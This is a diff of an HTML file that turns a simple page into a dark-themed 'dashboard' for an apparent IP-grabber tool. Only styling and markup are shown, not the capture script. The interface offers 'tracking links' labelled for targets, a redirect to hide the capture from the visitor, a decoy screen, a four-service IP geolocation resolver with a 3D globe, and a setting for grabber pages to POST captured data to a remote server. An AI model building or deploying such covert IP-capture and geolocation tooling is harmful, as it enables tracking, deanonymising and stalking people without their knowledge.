@@ -4,1385 +4,1878 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
-<title>.</title>
+<title>dashboard</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%}
   body{
     background:#000;color:#fff;
-    font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
-    overflow:hidden;-webkit-font-smoothing:antialiased;
+    font:13px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    -webkit-font-smoothing:antialiased;overflow:hidden;
   }
-  #snow{position:fixed;inset:0;pointer-events:none;z-index:0}
-  .wrap{
-    position:relative;z-index:1;height:100%;
-    display:flex;align-items:center;justify-content:center;
-    padding:20px;
-  }
-  .wrap.hidden{display:none}
-  .app{width:100%;max-width:440px}
-  .field{
-    display:flex;gap:6px;align-items:center;
-    background:#0a0a0a;border:1px solid #1e1e1e;
-    border-radius:999px;padding:6px;transition:border-color .2s;
-  }
-  .field.bad{border-color:#633}
-  .field.ok{border-color:#383}
-  .field input{
-    flex:1;min-width:0;background:transparent;border:0;outline:0;
-    color:#fff;font:13px ui-monospace,Menlo,Consolas,monospace;
-    padding:10px 16px;
-  }
-  .field input::placeholder{color:#333}
-  .field button{
-    background:#fff;color:#000;border:0;border-radius:999px;
-    height:36px;min-width:44px;padding:0 16px;
-    font:14px/1 ui-monospace,Menlo,Consolas,monospace;
-    cursor:pointer;transition:background .15s;
-    display:flex;align-items:center;justify-content:center;
-  }
-  .field button:hover{background:#bbb}
-  .field button:active{background:#888}
-  .field button:disabled{opacity:.5;cursor:default}
-  .status{
-    margin-top:10px;font-size:11px;color:#666;
-    min-height:14px;text-align:center;
-    word-break:break-all;line-height:1.5;
-  }
-  .status.ok{color:#6d6}
-  .status.err{color:#d66}
-  .result{
-    margin-top:12px;background:#0a0a0a;border:1px solid #1e1e1e;
-    border-radius:16px;padding:14px 16px;
-    font-size:12px;color:#ddd;word-break:break-all;
-    user-select:all;cursor:pointer;
-    opacity:0;transform:translateY(-4px);
-    transition:opacity .25s, transform .25s;
-    pointer-events:none;
-  }
-  .result.show{opacity:1;transform:translateY(0);pointer-events:auto}
+  ::selection{background:#fff;color:#000}
+  ::-webkit-scrollbar{width:8px;height:8px}
+  ::-webkit-scrollbar-track{background:#000}
+  ::-webkit-scrollbar-thumb{background:#1a1a1a;border-radius:4px}
+  ::-webkit-scrollbar-thumb:hover{background:#2a2a2a}
 
-  /* ── browser info page ── */
-  #info{
-    position:fixed;inset:0;z-index:2;
-    background:#0b0b0c;color:#e8e8e8;
-    font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
-    padding:24px;max-width:960px;margin:0 auto;
-    overflow-y:auto;display:none;
+  .hidden{display:none !important}
+
+  /* ═══════════ LAYOUT ═══════════ */
+  #dash{display:flex;height:100vh;overflow:hidden}
+
+  aside#sidebar{
+    width:230px;background:#000;border-right:1px solid #141414;
+    display:flex;flex-direction:column;flex-shrink:0;
+    transition:transform .3s cubic-bezier(.4,0,.2,1);
   }
-  #info.show{display:block}
-  #info h1{font-size:15px;font-weight:600;margin-bottom:4px}
-  #info .sub{color:#777;font-size:11px;margin-bottom:20px}
-  #info .notice{
-    background:#151518;border:1px solid #26262b;border-left:2px solid #4a9;
-    border-radius:6px;padding:10px 14px;font-size:11px;color:#8a9;margin-bottom:20px;
+  .brand{
+    padding:22px 20px 20px;font-size:14px;font-weight:600;letter-spacing:-.01em;
+    border-bottom:1px solid #141414;display:flex;align-items:center;gap:10px;
+    color:#fff;
   }
-  #info section{margin-bottom:22px}
-  #info h2{
-    font-size:11px;font-weight:600;color:#8a8a92;text-transform:uppercase;
-    letter-spacing:.08em;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #1e1e22;
+  .brand .logo{
+    width:22px;height:22px;flex-shrink:0;
+    display:flex;align-items:center;justify-content:center;
+    color:#fff;
+    transition:transform .3s cubic-bezier(.4,0,.2,1);
   }
-  #info .row{display:flex;gap:12px;padding:4px 0;border-bottom:1px solid #141417}
-  #info .row:last-child{border-bottom:0}
-  #info .k{flex:0 0 210px;color:#777;font-size:11px}
-  #info .v{flex:1;color:#ddd;word-break:break-word;font-size:11px}
-  #info .v.none{color:#555;font-style:italic}
-  #info .v.bad{color:#e88}
-  #info .v.ok{color:#8c8}
-  #info .bar{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap}
-  #info button{
-    background:#1a1a1e;color:#ddd;border:1px solid #2a2a30;border-radius:6px;
-    padding:7px 14px;font:11px ui-monospace,Menlo,Consolas,monospace;cursor:pointer;
+  .brand:hover .logo{transform:translateY(-2px) scale(1.08)}
+  .brand .logo svg{
+    width:100%;height:100%;
+    stroke:currentColor;fill:none;
+    stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;
   }
-  #info button:hover{background:#24242a}
-  #info pre{
-    background:#101013;border:1px solid #1e1e22;border-radius:6px;
-    padding:12px;font-size:10px;line-height:1.5;color:#aaa;
-    overflow:auto;max-height:360px;white-space:pre-wrap;word-break:break-all;
+
+  nav{padding:12px 10px;flex:1;overflow-y:auto}
+  nav a{
+    position:relative;
+    display:flex;align-items:center;gap:12px;padding:10px 12px;
+    color:#666;text-decoration:none;border-radius:8px;
+    font-size:12.5px;font-weight:500;cursor:pointer;
+    transition:color .2s, background .2s, padding .2s;
+    user-select:none;margin-bottom:2px;
   }
-  #info canvas{display:none}
+  nav a::before{
+    content:"";position:absolute;left:0;top:50%;
+    width:2px;height:0;background:#fff;border-radius:2px;
+    transform:translateY(-50%);
+    transition:height .25s cubic-bezier(.4,0,.2,1);
+  }
+  nav a:hover{color:#e0e0e0;background:#0a0a0a;padding-left:16px}
+  nav a:hover .ico{transform:scale(1.05)}
+  nav a.active{color:#fff;background:#0d0d0d;padding-left:16px}
+  nav a.active::before{height:18px}
+  nav a.active .ico{transform:scale(1.05)}
+
+  nav a .ico{
+    width:16px;height:16px;flex-shrink:0;
+    stroke:currentColor;fill:none;stroke-width:1.7;
+    stroke-linecap:round;stroke-linejoin:round;
+    transition:transform .25s cubic-bezier(.4,0,.2,1);
+  }
+  nav a .badge{
+    margin-left:auto;background:#141414;color:#888;
+    font-size:10px;font-weight:600;padding:2px 7px;border-radius:10px;
+    transition:all .2s;min-width:20px;text-align:center;
+  }
+  nav a:hover .badge{background:#1e1e1e;color:#ccc}
+  nav a.active .badge{background:#fff;color:#000}
+  .sidebar-foot{
+    padding:14px 20px;border-top:1px solid #141414;
+    font-size:10px;color:#444;letter-spacing:.04em;
+    display:flex;align-items:center;gap:6px;
+  }
+  .sidebar-foot .dot{
+    width:5px;height:5px;background:#fff;border-radius:50%;
+    animation:pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+  main#main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+  header#topbar{
+    height:56px;flex-shrink:0;border-bottom:1px solid #141414;
+    display:flex;align-items:center;padding:0 24px;gap:14px;
+    background:#000;
+  }
+  #topbar h1{font-size:15px;font-weight:600;color:#fff;letter-spacing:-.01em}
+  #topbar .crumb{color:#444;font-size:11px;font-family:ui-monospace,monospace}
+  #topbar .spacer{flex:1}
+  #topbar .status{
+    font-size:10px;color:#888;padding:5px 12px;font-weight:500;
+    background:#0a0a0a;border-radius:20px;border:1px solid #1a1a1a;
+    display:flex;align-items:center;gap:6px;
+    transition:all .2s;
+  }
+  #topbar .status::before{
+    content:"";width:5px;height:5px;background:#888;border-radius:50%;
+    transition:background .2s;
+  }
+  #topbar .status.live{color:#fff;border-color:#333}
+  #topbar .status.live::before{background:#fff;animation:pulse 1.5s ease-in-out infinite}
+
+  #pages{flex:1;overflow-y:auto;overflow-x:hidden;padding:26px}
+  .page{display:none}
+  .page.active{display:block;animation:fadeIn .35s cubic-bezier(.4,0,.2,1)}
+  @keyframes fadeIn{
+    from{opacity:0;transform:translateY(8px)}
+    to{opacity:1;transform:none}
+  }
+
+  /* ═══════════ CARDS ═══════════ */
+  .grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fill,minmax(190px,1fr))}
+  .card{
+    background:#050505;border:1px solid #141414;border-radius:12px;
+    padding:18px;position:relative;overflow:hidden;
+    transition:all .3s cubic-bezier(.4,0,.2,1);
+  }
+  .card::after{
+    content:"";position:absolute;top:0;left:-100%;width:100%;height:1px;
+    background:linear-gradient(90deg,transparent,#fff,transparent);
+    transition:left .6s;
+  }
+  .card:hover{border-color:#2a2a2a;background:#080808;transform:translateY(-2px)}
+  .card:hover::after{left:100%}
+  .card .lbl{
+    font-size:10px;color:#555;text-transform:uppercase;
+    letter-spacing:.12em;margin-bottom:10px;font-weight:600;
+    transition:color .2s;
+  }
+  .card:hover .lbl{color:#888}
+  .card .val{
+    font-size:26px;font-weight:700;color:#fff;
+    letter-spacing:-.02em;line-height:1;
+    transition:transform .3s;
+  }
+  .card:hover .val{transform:translateX(2px)}
+  .card .val.sm{font-size:15px;font-weight:500;color:#ccc}
+  .card .sub{font-size:10px;color:#444;margin-top:8px;transition:color .2s}
+  .card:hover .sub{color:#666}
+
+  /* ═══════════ SECTION HEADERS ═══════════ */
+  h2.sec{
+    font-size:11px;color:#666;text-transform:uppercase;
+    letter-spacing:.14em;margin:28px 0 14px;font-weight:600;
+    display:flex;align-items:center;gap:12px;
+  }
+  h2.sec:first-child{margin-top:0}
+  h2.sec .line{
+    flex:1;height:1px;
+    background:linear-gradient(90deg,#1a1a1a,transparent);
+  }
+
+  /* ═══════════ TABLES ═══════════ */
+  .tbl{
+    width:100%;border-collapse:collapse;background:#050505;
+    border:1px solid #141414;border-radius:12px;overflow:hidden;
+    transition:border-color .2s;
+  }
+  .cap-item:hover .tbl{border-color:#252525}
+  .tbl th{
+    text-align:left;font-size:10px;color:#555;text-transform:uppercase;
+    letter-spacing:.12em;padding:12px 16px;border-bottom:1px solid #141414;
+    background:#000;font-weight:600;
+  }
+  .tbl td{
+    padding:13px 16px;font-size:12px;border-bottom:1px solid #0e0e0e;
+    vertical-align:middle;color:#ccc;
+    transition:background .15s;
+  }
+  .tbl tr:last-child td{border-bottom:0}
+  .tbl tr:hover td{background:#0a0a0a}
+
+  .ip{
+    font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;
+    color:#fff;display:inline-flex;align-items:center;gap:8px;
+    letter-spacing:.02em;
+  }
+  .eye{
+    width:16px;height:16px;cursor:pointer;opacity:.3;
+    transition:opacity .2s, transform .2s;
+    display:inline-flex;align-items:center;color:#fff;
+    vertical-align:middle;
+  }
+  .eye:hover{opacity:.75;transform:scale(1.15)}
+  .eye.on{opacity:1}
+  .eye svg{
+    width:16px;height:16px;stroke:currentColor;fill:none;
+    stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  .pill{
+    display:inline-block;font-size:10px;font-weight:600;
+    padding:3px 9px;border-radius:10px;
+    background:#141414;color:#aaa;border:1px solid #1e1e1e;
+    transition:all .2s;letter-spacing:.02em;
+    font-family:ui-monospace,Menlo,Consolas,monospace;
+  }
+  .pill.ok{background:#fff;color:#000;border-color:#fff}
+  .pill.warn{background:#1a1a1a;color:#fff;border-color:#2a2a2a}
+  .pill.bad{background:#0a0a0a;color:#666;border-color:#1a1a1a}
+
+  /* ═══════════ BUTTONS ═══════════ */
+  button, .btn{
+    background:#0a0a0a;color:#ddd;border:1px solid #1e1e1e;
+    border-radius:8px;padding:8px 15px;font:12px/1 inherit;
+    font-weight:500;cursor:pointer;transition:all .2s cubic-bezier(.4,0,.2,1);
+    display:inline-flex;align-items:center;gap:7px;
+    user-select:none;position:relative;overflow:hidden;
+    font-family:inherit;
+  }
+  button::before{
+    content:"";position:absolute;inset:0;
+    background:radial-gradient(circle at center, rgba(255,255,255,.1), transparent 70%);
+    opacity:0;transition:opacity .3s;
+  }
+  button:hover{background:#141414;border-color:#333;color:#fff;transform:translateY(-1px)}
+  button:hover::before{opacity:1}
+  button:active{transform:translateY(0) scale(.98)}
+  button.primary{
+    background:#fff;color:#000;border-color:#fff;font-weight:600;
+  }
+  button.primary::before{
+    background:radial-gradient(circle at center, rgba(0,0,0,.15), transparent 70%);
+  }
+  button.primary:hover{background:#ddd;border-color:#ddd;color:#000}
+  button.danger{background:#0a0a0a;color:#888;border-color:#1e1e1e}
+  button.danger:hover{background:#141414;color:#fff;border-color:#333}
+  button.sm{padding:6px 11px;font-size:11px;border-radius:7px}
+  button.sm svg{width:13px;height:13px}
+  button svg{
+    width:15px;height:15px;stroke:currentColor;fill:none;
+    stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;
+    transition:transform .25s;
+    flex-shrink:0;
+  }
+  button:hover svg{transform:scale(1.08)}
+
+  /* ═══════════ INPUTS ═══════════ */
+  input[type=text], input[type=url], textarea, select{
+    background:#050505;border:1px solid #1a1a1a;border-radius:9px;
+    padding:11px 15px;color:#fff;font:12.5px/1.4 inherit;
+    outline:none;width:100%;
+    transition:border-color .2s, background .2s, box-shadow .2s;
+    font-family:inherit;
+  }
+  input:focus, textarea:focus, select:focus{
+    border-color:#444;background:#080808;
+    box-shadow:0 0 0 3px rgba(255,255,255,.04);
+  }
+  input::placeholder{color:#3a3a3a}
+  textarea{resize:vertical;min-height:80px;font-size:11.5px}
+
+  .field{margin-bottom:16px}
+  .field label{
+    display:block;font-size:10px;color:#666;
+    text-transform:uppercase;letter-spacing:.12em;
+    margin-bottom:8px;font-weight:600;
+  }
+  .field .hint{font-size:10.5px;color:#444;margin-top:8px;line-height:1.6}
+
+  /* ═══════════ LINK OUT ═══════════ */
+  .linkout{
+    background:#050505;border:1px solid #1a1a1a;border-radius:11px;
+    padding:15px 18px;display:flex;align-items:center;gap:12px;
+    font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11.5px;
+    color:#fff;word-break:break-all;
+    transition:border-color .2s, background .2s;
+  }
+  .linkout:hover{border-color:#2a2a2a;background:#080808}
+  .linkout .url{flex:1;user-select:all;cursor:text;letter-spacing:.01em}
+  .linkout .url .hash{color:#fff;font-weight:700}
+  .linkout .copy{flex-shrink:0}
+
+  /* ═══════════ DETAIL DRAWER ═══════════ */
+  .drawer{
+    background:#050505;border:1px solid #1a1a1a;border-top:0;
+    border-radius:0 0 11px 11px;padding:16px 20px;
+    animation:drawerIn .25s cubic-bezier(.4,0,.2,1);
+  }
+  .drawer.standalone{border-top:1px solid #1a1a1a;border-radius:11px}
+  @keyframes drawerIn{
+    from{opacity:0;transform:translateY(-4px)}
+    to{opacity:1;transform:none}
+  }
+  .drawer .row{
+    display:flex;gap:16px;padding:6px 0;
+    border-bottom:1px solid #0e0e0e;font-size:11.5px;line-height:1.55;
+    transition:background .15s;
+  }
+  .drawer .row:hover{background:#080808;margin:0 -20px;padding:6px 20px}
+  .drawer .row:last-child{border-bottom:0}
+  .drawer .k{
+    flex:0 0 170px;color:#555;
+    transition:color .15s;
+  }
+  .drawer .row:hover .k{color:#999}
+  .drawer .v{
+    flex:1;color:#ddd;word-break:break-word;
+    font-family:ui-monospace,Menlo,Consolas,monospace;
+  }
+  .drawer h3{
+    font-size:10px;color:#666;text-transform:uppercase;
+    letter-spacing:.14em;margin:16px 0 10px;font-weight:600;
+  }
+  .drawer h3:first-child{margin-top:0}
+
+  /* ═══════════ SOURCE BREAKDOWN ═══════════ */
+  .sources{
+    display:grid;gap:10px;
+    grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+    margin-top:14px;
+  }
+  .src{
+    background:#050505;border:1px solid #141414;border-radius:10px;
+    padding:12px 14px;position:relative;
+    transition:all .25s cubic-bezier(.4,0,.2,1);
+  }
+  .src:hover{border-color:#2a2a2a;background:#080808;transform:translateY(-1px)}
+  .src .name{
+    font-size:10px;color:#666;text-transform:uppercase;
+    letter-spacing:.1em;font-weight:600;margin-bottom:8px;
+    display:flex;align-items:center;gap:6px;
+  }
+  .src .name .dot{
+    width:5px;height:5px;border-radius:50%;background:#fff;
+    transition:all .2s;
+  }
+  .src.consensus .name .dot{box-shadow:0 0 8px #fff}
+  .src .loc{font-size:12px;color:#fff;margin-bottom:4px}
+  .src .coord{
+    font-size:10.5px;color:#666;
+    font-family:ui-monospace,Menlo,Consolas,monospace;
+  }
+  .src .badge{
+    position:absolute;top:12px;right:12px;
+    font-size:9px;color:#666;padding:2px 6px;
+    background:#0a0a0a;border-radius:6px;border:1px solid #1a1a1a;
+  }
+  .src.consensus{
+    border-color:#333;background:#0a0a0a;
+  }
+  .src.consensus::before{
+    content:"";position:absolute;left:0;top:12px;bottom:12px;
+    width:2px;background:#fff;border-radius:2px;
+  }
+  .src.consensus .loc{color:#fff;font-weight:600}
+  .src.err{border-color:#1a1a1a;opacity:.55}
+  .src.err .loc{color:#666;font-style:italic}
+
+  /* ═══════════ CONFIDENCE BAR ═══════════ */
+  .conf{
+    display:flex;align-items:center;gap:10px;margin-top:14px;
+    font-size:10.5px;color:#666;
+  }
+  .conf .bar{
+    flex:1;height:4px;background:#0f0f0f;border-radius:2px;
+    overflow:hidden;
+  }
+  .conf .fill{
+    height:100%;background:#fff;border-radius:2px;
+    transition:width .6s cubic-bezier(.4,0,.2,1);
+  }
+  .conf .val{font-weight:600;color:#fff;font-family:ui-monospace,monospace}
+
+  /* ═══════════ 3D GLOBE ═══════════ */
+  #globe{
+    width:100%;height:560px;border-radius:14px;overflow:hidden;
+    background:radial-gradient(ellipse at center, #080808 0%, #000 100%);
+    border:1px solid #141414;position:relative;
+    cursor:grab;margin-top:22px;
+    transition:border-color .3s;
+  }
+  #globe:hover{border-color:#222}
+  #globe:active{cursor:grabbing}
+  #globe canvas{display:block}
+  .globe-info{
+    position:absolute;top:16px;left:16px;
+    background:rgba(0,0,0,.8);backdrop-filter:blur(10px);
+    border:1px solid #1e1e1e;border-radius:10px;
+    padding:12px 16px;font-size:11px;color:#ccc;
+    pointer-events:none;font-weight:500;
+    max-width:280px;
+  }
+  .globe-info b{color:#fff;font-weight:700}
+  .globe-info .sub{
+    display:block;color:#666;font-size:10px;margin-top:4px;
+    font-family:ui-monospace,monospace;
+  }
+  .globe-legend{
+    position:absolute;bottom:16px;right:16px;
+    background:rgba(0,0,0,.8);backdrop-filter:blur(10px);
+    border:1px solid #1e1e1e;border-radius:10px;
+    padding:10px 14px;font-size:10px;color:#888;
+    display:flex;gap:16px;font-weight:500;
+  }
+  .globe-legend span{display:flex;align-items:center;gap:6px}
+  .globe-legend i{
+    width:7px;height:7px;border-radius:50%;display:inline-block;
+    background:#fff;
+  }
+  .globe-legend i.dim{background:#555}
+  .globe-legend i.tiny{width:5px;height:5px;background:#888}
+  .globe-focus{
+    position:absolute;bottom:16px;left:16px;
+    background:rgba(0,0,0,.8);backdrop-filter:blur(10px);
+    border:1px solid #1e1e1e;border-radius:10px;
+    padding:8px 12px;font-size:10px;color:#888;
+    cursor:pointer;font-weight:500;
+    transition:all .2s;
+  }
+  .globe-focus:hover{color:#fff;border-color:#333;background:rgba(20,20,20,.9)}
+
+  /* ═══════════ EMPTY STATE ═══════════ */
+  .empty{
+    text-align:center;padding:70px 20px;color:#555;
+    background:#030303;border:1px dashed #1a1a1a;border-radius:14px;
+    animation:fadeIn .4s;
+  }
+  .empty svg{
+    width:40px;height:40px;stroke:#2a2a2a;fill:none;
+    stroke-width:1.3;stroke-linecap:round;stroke-linejoin:round;
+    margin-bottom:16px;
+  }
+  .empty .t{font-size:13.5px;color:#999;margin-bottom:6px;font-weight:500}
+  .empty .d{font-size:11.5px;color:#555;line-height:1.6}
+
+  /* ═══════════ TOAST ═══════════ */
+  #toasts{
+    position:fixed;top:22px;right:22px;z-index:999;
+    display:flex;flex-direction:column;gap:10px;pointer-events:none;
+  }
+  .toast{
+    background:#0a0a0a;border:1px solid #1e1e1e;
+    border-radius:10px;padding:12px 18px;font-size:11.5px;color:#fff;
+    box-shadow:0 12px 40px rgba(0,0,0,.7);min-width:240px;
+    font-weight:500;
+    position:relative;overflow:hidden;
+    animation:toastIn .3s cubic-bezier(.4,0,.2,1);
+    pointer-events:auto;
+  }
+  .toast::before{
+    content:"";position:absolute;left:0;top:0;bottom:0;
+    width:2px;background:#fff;
+  }
+  .toast.err::before{background:#666}
+  .toast.err{color:#aaa}
+  @keyframes toastIn{
+    from{transform:translateX(30px);opacity:0}
+    to{transform:none;opacity:1}
+  }
+
+  /* ═══════════ DECOY ═══════════ */
+  #decoy{
+    position:fixed;inset:0;background:#000;display:flex;
+    align-items:center;justify-content:center;color:#333;font-size:12px;
+  }
+
+  /* ═══════════ SPINNER ═══════════ */
+  .spin{
+    width:14px;height:14px;border:1.8px solid #1e1e1e;border-top-color:#fff;
+    border-radius:50%;animation:spin .7s linear infinite;display:inline-block;
+    vertical-align:middle;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* ═══════════ LINK PREVIEW ═══════════ */
+  .link-preview{
+    background:#050505;border:1px solid #1a1a1a;border-radius:11px;
+    padding:16px 18px;margin-top:14px;
+    display:none;animation:fadeIn .3s;
+  }
+  .link-preview.show{display:block}
+  .link-preview .tag{
+    font-size:9.5px;color:#555;text-transform:uppercase;
+    letter-spacing:.14em;font-weight:600;margin-bottom:10px;
+  }
+  .link-preview .full{
+    font-family:ui-monospace,Menlo,Consolas,monospace;
+    font-size:12px;color:#fff;word-break:break-all;
+    user-select:all;cursor:text;
+  }
+  .link-preview .full .hash{font-weight:700}
+
+  /* ═══════════ MOBILE ═══════════ */
+  #menuBtn{display:none}
+  @media (max-width:760px){
+    #sidebar{position:fixed;left:0;top:0;bottom:0;z-index:50;
+      transform:translateX(-100%)}
+    #sidebar.open{transform:none;box-shadow:20px 0 60px rgba(0,0,0,.9)}
+    #menuBtn{display:inline-flex}
+    #globe{height:400px}
+    #pages{padding:18px}
+  }
 </style>
 </head>
 <body>
-<canvas id="snow"></canvas>
 
-<div class="wrap" id="ui">
-  <div class="app">
-    <div class="field" id="f">
-      <input id="wh" type="text" placeholder="webhook" spellcheck="false" autocomplete="off">
-      <button id="go">→</button>
+<!-- ═══ DASHBOARD ═══ -->
+<div id="dash" class="hidden">
+  <aside id="sidebar">
+    <div class="brand">
+      <div class="logo">
+        <svg viewBox="0 0 24 24">
+          <path d="M3 10.5 12 3l9 7.5"/>
+          <path d="M5 9.5V20a1 1 0 0 0 1 1h4v-6h4v6h4a1 1 0 0 0 1-1V9.5"/>
+        </svg>
+      </div>
+      dashboard
     </div>
-    <div class="status" id="st"></div>
-    <div class="result" id="out"></div>
-  </div>
+    <nav id="nav">
+      <a data-page="overview">
+        <svg class="ico" viewBox="0 0 24 24">
+          <rect x="3" y="3" width="7" height="9" rx="1"/>
+          <rect x="14" y="3" width="7" height="5" rx="1"/>
+          <rect x="14" y="12" width="7" height="9" rx="1"/>
+          <rect x="3" y="16" width="7" height="5" rx="1"/>
+        </svg>
+        Overview
+      </a>
+      <a data-page="captures">
+        <svg class="ico" viewBox="0 0 24 24">
+          <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+        Captures <span class="badge" id="captureCount">0</span>
+      </a>
+      <a data-page="links">
+        <svg class="ico" viewBox="0 0 24 24">
+          <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+          <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+        </svg>
+        Create Link
+      </a>
+      <a data-page="resolver">
+        <svg class="ico" viewBox="0 0 24 24">
+          <circle cx="11" cy="11" r="7"/>
+          <path d="m20 20-3.5-3.5"/>
+          <path d="M11 8v3l2 2"/>
+        </svg>
+        IP Resolver
+      </a>
+      <a data-page="settings">
+        <svg class="ico" viewBox="0 0 24 24">
+          <line x1="4" y1="6" x2="20" y2="6"/>
+          <line x1="4" y1="12" x2="20" y2="12"/>
+          <line x1="4" y1="18" x2="20" y2="18"/>
+          <circle cx="9" cy="6" r="2" fill="#000"/>
+          <circle cx="15" cy="12" r="2" fill="#000"/>
+          <circle cx="9" cy="18" r="2" fill="#000"/>
+        </svg>
+        Settings
+      </a>
+    </nav>
+    <div class="sidebar-foot">
+      <span class="dot"></span>
+      local-only · v2.0
+    </div>
+  </aside>
+
+  <main id="main">
+    <header id="topbar">
+      <button id="menuBtn" class="sm">
+        <svg viewBox="0 0 24 24">
+          <line x1="3" y1="6" x2="21" y2="6"/>
+          <line x1="3" y1="12" x2="21" y2="12"/>
+          <line x1="3" y1="18" x2="21" y2="18"/>
+        </svg>
+      </button>
+      <h1 id="pageTitle">Overview</h1>
+      <span class="crumb" id="pageCrumb">dashboard</span>
+      <span class="spacer"></span>
+      <span class="status" id="statusPill">local mode</span>
+    </header>
+
+    <div id="pages">
+
+      <!-- ═══ OVERVIEW ═══ -->
+      <section class="page active" data-page="overview">
+        <h2 class="sec">stats <span class="line"></span></h2>
+        <div class="grid">
+          <div class="card">
+            <div class="lbl">total captures</div>
+            <div class="val" id="statTotal">0</div>
+            <div class="sub" id="statTotalSub">no captures yet</div>
+          </div>
+          <div class="card">
+            <div class="lbl">unique IPs</div>
+            <div class="val" id="statUnique">0</div>
+          </div>
+          <div class="card">
+            <div class="lbl">active links</div>
+            <div class="val" id="statLinks">0</div>
+          </div>
+          <div class="card">
+            <div class="lbl">last capture</div>
+            <div class="val sm" id="statLast">—</div>
+          </div>
+        </div>
+        <h2 class="sec">recent activity <span class="line"></span></h2>
+        <div id="recentList"></div>
+      </section>
+
+      <!-- ═══ CAPTURES ═══ -->
+      <section class="page" data-page="captures">
+        <h2 class="sec">
+          captures <span class="line"></span>
+          <button class="sm" id="revealAll">
+            <svg viewBox="0 0 24 24">
+              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            Reveal all
+          </button>
+          <button class="sm danger" id="clearCaptures">
+            <svg viewBox="0 0 24 24">
+              <path d="M3 6h18"/>
+              <path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
+              <path d="m19 6-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>
+            </svg>
+            Clear
+          </button>
+        </h2>
+        <div id="capturesList"></div>
+      </section>
+
+      <!-- ═══ LINKS ═══ -->
+      <section class="page" data-page="links">
+        <h2 class="sec">create tracking link <span class="line"></span></h2>
+        <div class="card" style="padding:22px">
+          <div class="field">
+            <label>label (optional)</label>
+            <input type="text" id="linkLabel" placeholder="e.g. twitter, target-1" spellcheck="false">
+          </div>
+          <div class="field">
+            <label>destination (optional redirect)</label>
+            <input type="url" id="linkDest" placeholder="https://example.com" spellcheck="false">
+            <div class="hint">After capture, the visitor is redirected here. Leave blank to show a blank page.</div>
+          </div>
+          <button class="primary" id="makeLink">
+            <svg viewBox="0 0 24 24">
+              <line x1="12" y1="5" x2="12" y2="19"/>
+              <line x1="5" y1="12" x2="19" y2="12"/>
+            </svg>
+            Generate link
+          </button>
+
+          <div class="link-preview" id="linkPreview">
+            <div class="tag">your new link</div>
+            <div class="full" id="linkPreviewFull"></div>
+          </div>
+        </div>
+        <h2 class="sec" style="margin-top:30px">
+          your links <span class="line"></span>
+          <button class="sm danger" id="clearLinks">Clear all</button>
+        </h2>
+        <div id="linksList"></div>
+      </section>
+
+      <!-- ═══ RESOLVER + 3D GEO ═══ -->
+      <section class="page" data-page="resolver">
+        <h2 class="sec">ip resolver <span class="line"></span></h2>
+        <div class="card" style="padding:22px">
+          <div class="field">
+            <label>ip address</label>
+            <div style="display:flex;gap:10px">
+              <input type="text" id="resolveIp" placeholder="8.8.8.8" spellcheck="false">
+              <button class="primary" id="resolveBtn">
+                <svg viewBox="0 0 24 24">
+                  <circle cx="11" cy="11" r="7"/>
+                  <path d="m20 20-3.5-3.5"/>
+                </svg>
+                Resolve
+              </button>
+            </div>
+            <div class="hint">
+              Multi-layer resolve — queries 4 independent geolocation services in
+              parallel, computes a consensus location, and pin-points it on the 3D map.
+            </div>
+          </div>
+        </div>
+
+        <div id="resolveOut" style="margin-top:22px"></div>
+
+        <div id="globe">
+          <div class="globe-info" id="globeInfo">
+            Resolve an IP to pin it
+            <span class="sub">4 sources · consensus triangulation</span>
+          </div>
+          <div class="globe-legend">
+            <span><i></i>consensus</span>
+            <span><i class="dim"></i>source</span>
+          </div>
+          <div class="globe-focus" id="globeFocus" style="display:none">
+            <svg viewBox="0 0 24 24" style="width:11px;height:11px;vertical-align:-1px;margin-right:4px;stroke:currentColor;fill:none;stroke-width:2">
+              <circle cx="12" cy="12" r="3"/>
+              <path d="M12 2v3M12 19v3M2 12h3M19 12h3"/>
+            </svg>
+            Focus consensus
+          </div>
+        </div>
+      </section>
+
+      <!-- ═══ SETTINGS ═══ -->
+      <section class="page" data-page="settings">
+        <h2 class="sec">logging endpoint <span class="line"></span></h2>
+        <div class="card" style="padding:22px">
+          <div class="field">
+            <label>POST endpoint url (optional)</label>
+            <input type="url" id="setEndpoint" placeholder="https://your-server.com/capture" spellcheck="false">
+            <div class="hint">
+              When set, grabber pages will POST the capture JSON to this URL. Use this
+              to log captures from other devices (needs your own small server).
+              Leave blank to store captures locally only.
+            </div>
+          </div>
+          <button class="primary" id="saveEndpoint">
+            <svg viewBox="0 0 24 24">
+              <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/>
+              <path d="M17 21v-8H7v8"/>
+              <path d="M7 3v5h8"/>
+            </svg>
+            Save
+          </button>
